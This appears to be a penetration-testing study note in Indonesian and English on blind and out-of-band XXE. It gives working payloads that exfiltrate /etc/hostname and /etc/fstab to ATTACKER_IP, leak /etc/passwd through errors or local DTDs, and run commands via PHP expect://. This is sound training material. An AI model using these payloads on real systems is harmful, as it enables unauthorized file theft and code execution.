2026-02-06

Status:

Tags: [[eWPTX]] [[XML]]
###### Prasyarat: [[XML External Entities (XXE)]]
# Blind & OOB XXE

## Gambaran singkat

Di blind XXE, server memproses payload XXE tapi tidak memantulkan nilai entity ke response. Jadi kamu butuh channel out-of-band (OOB) untuk exfiltrate data.

---

## Kapan memakai blind XXE

- Aplikasi mem-parse XML tapi tidak menampilkan nilai entity
- Error message disembunyikan
- Response cenderung “flat” (mis. selalu 200 OK) apa pun isi request

---

## OOB Exfiltration via Parameter Entities

### Langkah 1: Host DTD berbahaya di server kamu

Create `evil.dtd` on attacker server:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
%eval;
%exfil;
```

### Langkah 2: Kirim payload XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">
  %xxe;
]>
<foo>bar</foo>
```

### Langkah 3: Tangkap data di server kamu

```bash
# Start a listener
python3 -m http.server 8000

# You'll see:
# GET /?data=web-server-01 HTTP/1.1
```

Isi file akan “datang” sebagai query parameter di request HTTP.

---

## Deteksi berbasis DNS

Cara paling sederhana untuk memastikan blind XXE — tanpa exfil data, hanya konfirmasi vulnerabilitasnya ada:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-test.ATTACKER-DOMAIN.com">
]>
<foo>&xxe;</foo>
```

Gunakan Burp Collaborator atau interactsh untuk mendeteksi DNS lookup/callback.

---

## Error-based XXE

Memaksa parser “membocorkan” isi file lewat error message:

### Langkah 1: Host error DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Langkah 2: Kirim payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/error.dtd">
  %xxe;
]>
<foo>bar</foo>
```

The parser error message may contain:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash...
```

---

## Blind XXE via local DTD

Saat server memblokir koneksi outbound, kamu bisa memanfaatkan DTD lokal yang sudah ada di server:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo>bar</foo>
```

Common local DTDs to try:
- `/usr/share/yelp/dtd/docbookx.dtd` (Linux with GNOME)
- `/usr/share/xml/fontconfig/fonts.dtd` (Linux)
- `/usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd` (Tomcat)

---

## CDATA exfiltration untuk karakter yang memecahkan XML

Saat file mengandung `<`, `>`, `&` yang bisa memecahkan sintaks XML:

```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%start;%file;%end;'>">
%eval;
%exfil;
```

---

## PHP expect:// Wrapper (RCE)

If the PHP `expect` extension is loaded:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>
```

---

## Checklist pengujian

1. Test entity expansion dasar (konfirmasi non-blind)
2. Test DNS callback untuk konfirmasi blind XXE
3. Coba OOB HTTP exfiltration via external DTD
4. Jika outbound HTTP diblok, coba error-based extraction
5. Jika koneksi eksternal diblok total, coba teknik local DTD
6. Jika target PHP, cek kemungkinan wrapper PHP
